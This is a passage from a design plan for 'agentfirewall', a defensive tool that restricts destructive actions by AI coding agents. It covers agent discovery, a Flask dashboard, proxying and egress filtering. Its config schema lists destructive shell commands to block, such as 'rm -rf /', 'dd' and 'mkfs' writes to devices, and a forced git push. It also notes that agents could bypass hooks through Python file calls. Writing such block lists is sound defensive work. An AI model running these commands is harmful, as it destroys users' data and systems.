    | Aider | *(check PATH)* | *(check PATH)* | `.aider.conf.yml` |
    | Kiro | `~/.kiro/` | `~/.kiro/` | `.kiro/` |

16. Three discovery functions:
    - `discover_global() -> list[AgentInfo]` — scans home directory for agent installations
    - `discover_project(project: Path) -> list[AgentInfo]` — scans a project directory for agent config dirs/files
    - `discover_all(project: Path | None) -> list[AgentInfo]` — combined global + project results

### Phase 3B: Scan CLI Command

17. `agentfirewall scan [--project PATH] [--json]` — discovers agents, prints a table (agent name, scope, found paths) or JSON output. If no `.agentfirewall/` exists in the project, suggests `agentfirewall init`.

### Phase 3C: IDE Integration Snippets *(documentation only)*

18. Add to `docs/README.md`: copy-paste config snippets for VS Code `settings.json` MCP integration, Cursor MCP config, and Claude Desktop config. These are documentation templates, not code.

**Design decisions:**
- Discovery is **read-only** — detect agents, don't modify their configs. Auto-injection into agent configs is out of scope for now.
- Auto-activation hook enhancement (old Item 23) **deferred** — current hooks already work in any directory with `.agentfirewall/` via `find_config()` walking up parent dirs. The "auto-activate on `cd`" enhancement adds complexity for marginal benefit.
- Platform paths for Linux + macOS defined. Windows paths defined but not actively tested (matching existing project stance).

**Files to create:**
- `src/agentfirewall/discovery.py` — agent auto-detection (global + project scope, known agents registry)
- `tests/test_discovery.py` — ~12-15 tests: mock filesystem with `tmp_path`, test each agent detection independently, mock `sys.platform` for platform-specific paths, test empty results, test `discover_all` combines scopes
- `tests/test_cli_phase3.py` — ~4-6 tests: scan command output format, `--json` output, no agents found

**Files to modify:**
- `src/agentfirewall/cli.py` — add `scan` command

---

## Phase 4: Web UI Dashboard *(depends on Phase 1-2; agent display stubbed, wired when Phase 3 lands)*

`agentfirewall ui` launches a local Flask web server for visual configuration management and live log monitoring. Flask is an **optional dependency** — core CLI works without it.

> **Note:** Phase 4 is implemented before Phase 3. The `/api/agents` endpoint and dashboard agents panel are stubbed to return empty results. When Phase 3 (Agent Discovery) is implemented, wire `discover_all()` into the existing `/api/agents` route and the dashboard will auto-populate.

### Phase 4A: Flask App Factory & API Routes

19. *depends on 1-13 (Phase 3 not required)* — `create_app(config_dir: Path) -> Flask` app factory with the following routes:

    | Method | Path | Purpose |
    |---|---|---|
    | GET | `/` | Dashboard — mode badge, stats cards, discovered agents, quick actions |
    | GET | `/config` | Config editor page (full form for all settings) |
    | GET | `/logs` | Log viewer page (table with live updates) |
    | GET | `/api/config` | Return current config as JSON |
    | PUT | `/api/config` | Apply config changes, persist via `config_to_yaml()` |
    | POST | `/api/preset` | Switch to a preset, persist |
    | GET | `/api/logs` | Recent log entries as JSON (with optional `?verdict=deny` filter) |
    | GET | `/api/logs/stream` | SSE endpoint — tails `firewall.log` in real-time |
    | GET | `/api/agents` | Stubbed — returns empty list. Wire to `discover_all()` when Phase 3 is implemented |

20. Config persistence flow:
    1. `PUT /api/config` receives JSON body with config fields
    2. Server calls `load_config()` to get current `FirewallConfig`
    3. Applies changes to the dataclass
    4. Calls `config_to_yaml(config)` to serialize
    5. Writes YAML back to `.agentfirewall/config.yaml`
    6. Returns updated config JSON

21. Log streaming via **SSE** (Server-Sent Events, no extra dependency):
    - `GET /api/logs/stream` opens a `text/event-stream` response
    - Tails `firewall.log` using file seek + periodic poll (200ms)
    - Each new JSON log line sent as an SSE `data:` event
    - Client connects via `EventSource` API (native browser, no library needed)
    - Handles log rotation gracefully (catch `FileNotFoundError`, re-open)

### Phase 4B: Jinja2 Templates

22. Four templates using Jinja2 (bundled with Flask):
    - **`base.html`** — shared layout: nav (Dashboard | Config | Logs), page title, flash messages, links to static CSS/JS
    - **`dashboard.html`** — current mode badge (enforce/audit/off) with toggle buttons, stats cards (blocklist count, protected paths count, deny operations), agents placeholder panel (populated when Phase 3 lands), quick actions (switch preset, open config editor, start watcher)
    - **`config.html`** — mode selector (radio: enforce/audit/off), sandbox settings (root path, allow_escape toggle), blocklist (editable list — add/remove entries), allowlist (editable list), protected paths (editable list with glob patterns), deny operations (checkboxes: delete, chmod, move_outside_sandbox, write), network (allowed hosts + deny targets as editable lists), logging settings (enabled toggle, level select), preset quick-switch dropdown, save button → `PUT /api/config`
    - **`logs.html`** — filter bar (verdict filter: all/allow/deny/warn, search box), log table (timestamp, action_type, target, verdict, rule, detail), auto-scroll with live SSE updates, pause/resume button

### Phase 4C: Static Assets

23. **Vanilla JavaScript + CSS, no CDN, no build step, no framework:**
    - `style.css` — CSS variables for theming (light mode), card layout, form styling, log table styling, verdict badges (green=allow, red=deny, yellow=warn), responsive layout
    - `app.js` — mode toggle → `PUT /api/config`, config form submission → `PUT /api/config`, preset switch → `POST /api/preset`, log SSE connection via `EventSource`, client-side log filtering on streamed events, add/remove items in editable lists (blocklist, allowlist, etc.)

### Phase 4D: CLI Command & Integration

24. `agentfirewall ui [--port PORT] [--host HOST] [--no-open]`
    - Default: `localhost:8741`
    - Auto-opens browser via `webbrowser.open()` unless `--no-open`
    - Graceful error if Flask not installed: `click.echo("Flask required. Install with: pip install agentfirewall[ui]")`
    - Loads config from `find_config()` / `_load_engine()` pattern

**Design decisions:**
- **SSE over WebSocket** for log streaming — Flask supports it natively via generator responses, no extra dependency needed. Browser `EventSource` API is universal.
- **Vanilla JS over htmx/React** — no CDN dependency, no build step, keeps the project self-contained and auditable.
- **Flask as optional dependency** — `pip install agentfirewall[ui]` pattern keeps core CLI lightweight. Graceful import error at runtime.

**Files to create:**
- `src/agentfirewall/ui/__init__.py` — UI subpackage init
- `src/agentfirewall/ui/app.py` — Flask app factory, all routes, SSE log streaming
- `src/agentfirewall/ui/templates/base.html` — shared Jinja2 layout
- `src/agentfirewall/ui/templates/dashboard.html` — main dashboard
- `src/agentfirewall/ui/templates/config.html` — config editor
- `src/agentfirewall/ui/templates/logs.html` — log viewer
- `src/agentfirewall/ui/static/style.css` — dashboard styles
- `src/agentfirewall/ui/static/app.js` — client-side interactivity (vanilla JS)
- `tests/test_ui.py` — ~12-15 tests using Flask test client: pages return 200, `GET /api/config` returns valid JSON, `PUT /api/config` persists mode change to YAML, `POST /api/preset` switches preset, `GET /api/logs` returns filterable entries, `GET /api/agents` returns empty list (stubbed)

**Files to modify:**
- `src/agentfirewall/cli.py` — add `ui` command
- `pyproject.toml` — add `ui = ["flask>=3.0"]` to `[project.optional-dependencies]`

---

## Phase 5: Shell / Tool Call Layer (application level)

25. *depends on 5-24* — MCP proxy mode — local MCP stdio/SSE wrapper between agent and MCP servers, inspecting `tools/call` requests before forwarding
26. *parallel with 25* — Generic tool-call pattern parser for common agents (Copilot `run_in_terminal`, Claude Code shell, Cursor terminal)
27. Pattern matching engine for destructive operations: file destruction, git destruction, system commands, SQL DDL, container escapes
28. Allow-list mode — explicitly permit certain tool calls, deny all others

**Files to create:**
- `src/agentfirewall/mcp_proxy.py` — MCP stdio/SSE proxy
- `src/agentfirewall/patterns.py` — destructive command pattern matching
- `src/agentfirewall/agents/` — per-agent tool-call parsers

---

## Phase 6: Network Layer (TCP/IP stack)

29. *depends on 25-28* — Outbound connection monitor (via `/proc/net/tcp` or `ss`)
30. DNS/egress filtering — block connections to unknown hosts, cloud metadata endpoints (SSRF prevention: `169.254.169.254`, `metadata.google.internal`)
31. HTTP request inspection — URL/payload allowlists in dotfile
32. *(stretch)* eBPF-based deep interception at the syscall level (`unlink`, `execve`, `connect`)

**Files to create:**
- `src/agentfirewall/network/monitor.py` — connection tracker
- `src/agentfirewall/network/egress.py` — DNS/egress filtering
- `src/agentfirewall/network/http_inspect.py` — HTTP inspection
- `src/agentfirewall/network/ebpf.py` — eBPF syscall interception (stretch)

---

## Config Schema (`.agentfirewall/config.yaml`)

```yaml
# .agentfirewall/config.yaml
version: 1
mode: "enforce"  # enforce | audit | off

sandbox:
  root: "."
  allow_escape: false

filesystem:
  protected_paths:
    - ".agentfirewall/**"
    - ".git/**"
    - ".env"
    - ".ssh/**"
    - "/etc/**"
  deny_operations: [delete, chmod, move_outside_sandbox]
  kill_scope: "agents"  # "agents" = known LLM agents only, "all" = any responsible process (Linux: fanotify, macOS: fallback to agents)

commands:
  blocklist:
    - "rm -rf /"
    - "dd if=*of=/dev/*"
    - "mkfs.*"
    - "chmod -R 777"
    - "git push --force"
    - "git reset --hard"
    - "kill -9"
    - "> /dev/sda"
  allowlist: []  # if non-empty, ONLY these are allowed

network:
  allowed_hosts: [github.com, api.openai.com, api.anthropic.com]
  deny_egress_to: ["169.254.169.254", "metadata.google.internal"]
  max_upload_bytes: 10485760

logging:
  enabled: true
  file: "logs/firewall.log"  # relative to .agentfirewall/ directory
  level: warn
```

---

## Reference Projects

| Project | What to learn from it |
|---|---|
| **Invariant Guardrails** (`invariantlabs-ai/invariant`) | Best reference overall — Python-inspired rule language for matching tool call chains, `ToolCall → ToolOutput` flow analysis. Their rule syntax is the closest to what we'd want for the pattern matching engine. |
| **Invariant Gateway** (`invariantlabs-ai/invariant-gateway`) | MCP proxy architecture — how to sit between agent and MCP server, intercept `tools/call`, apply guardrails transparently. Reference for Phase 5. |
| **Snyk Agent Scan** (`snyk/agent-scan`, formerly `mcp-scan`) | Agent auto-discovery across all major agents (Copilot, Claude, Cursor, Windsurf, Gemini CLI). Threat taxonomy with 15+ issue codes. Reference for Phase 3 + threat modeling. |
| **guardrails-ai/guardrails** | Composable validator pattern, Hub model for community-contributed rules. Reference for the preset/plugin architecture. |
| **Firejail** (`netblue30/firejail`) | Linux sandboxing via namespaces + seccomp-bpf. The closest OS-level analogy to what we want in Phase 2. Reference for filesystem restriction enforcement. |
| **AppArmor / seccomp-bpf** (Linux kernel) | Syscall-level filtering. Reference for the eBPF stretch goal in Phase 6 step 32. |
| **MCP Specification** (`modelcontextprotocol.io`) | Protocol format for `tools/call`, security & trust guidelines. Essential reading for Phase 5. |
| **fusepy** (`fusepy/fusepy`) | Python bindings for FUSE. Pure Python, no C compilation. Reference for Phase 2F FUSE sandbox passthrough implementation. |

---

## Verification

1. **Unit tests** — rule engine parses config, matches destructive commands, blocks protected paths, allows safe ops
2. **Integration tests** — preexec hook blocks `rm -rf /`, allows `rm temp.txt`; filesystem watcher catches `os.remove()` on protected paths; sandbox boundary blocks writes outside root
3. **Discovery tests** — `agentfirewall scan` detects installed agents on the dev machine; `--json` output is valid JSON
4. **UI tests** — Flask test client: pages return 200, config edit persists to YAML, preset switch works, log endpoint returns filtered entries
5. **FUSE sandbox tests** — Phase 2G integration tests: mount lifecycle, deletion blocked, write blocked, allowed ops pass through, Python subprocess attack blocked (LangChain/OpenClaw scenario), config self-protection, audit logging for FUSE decisions, auto-unmount on command exit
6. **Manual test** — run `agentfirewall init`, ask Copilot to "delete all files", verify the shell hook blocks it; run `agentfirewall ui`, toggle mode in browser, verify `config.yaml` updated
7. **Audit log** — verify all decisions logged to `.agentfirewall/logs/firewall.log` with timestamp, agent identity, command, verdict

---

## Key Decisions

- **Python** — best MCP SDK ecosystem, inotify/eBPF tooling, target audience alignment
- **`.agentfirewall/` directory** — hidden directory like `.git/`, containing `config.yaml` + subdirs for rules, logs, hooks, plugins. More extensible than a single dotfile.
- **YAML config format** — human-readable, supports nested rule structures
- **Shell preexec hooks as MVP** — most impactful, simplest, covers all agents that run terminal commands
- **Linux first**, macOS second, Windows deferred
- **Excluded from MVP:** eBPF kernel enforcement, cloud/remote mode, multi-user policies
- **MVP includes:** Phase 1 (engine) + Phase 2 (OS/filesystem layer, including 2F FUSE sandbox) + Phase 3 (agent discovery) + Phase 4 (web UI dashboard). Phases 5-6 (tool call interception, network layer) deferred.
- **FUSE for true prevention** — shell hooks and watchers are reactive (detect after the fact). FUSE intercepts at the VFS level before the syscall completes, making it the only layer that provides true prevention. Stops all agents — interactive, subprocess-based, or otherwise.

---

## Open Considerations

1. **Bypass resistance** — A sophisticated agent could use Python `os.remove()` instead of `rm`, bypassing shell hooks. Complementary `inotify` watchers detect this at the filesystem level but are reactive. The **FUSE sandbox (Phase 2F)** is the primary prevention answer — it intercepts all filesystem operations at the VFS level before they complete, blocking both interactive and subprocess-based agents. Full tamper-proof enforcement beyond the filesystem (network, syscalls) may require eBPF (Phase 6 stretch). Recommendation: layered defense — hooks (interactive prevention) + watcher (reactive detection) + FUSE (true prevention for all agents).
2. **Agent identification** — Inspect parent PID chain to trace commands back to VS Code, Claude Desktop, etc. Enables per-agent policies in the dotfile.
3. **Hierarchical configs** — Like `.git/`, `.agentfirewall/` should be discoverable from parent directories with closest-directory-wins merge semantics, supporting monorepos and nested projects.
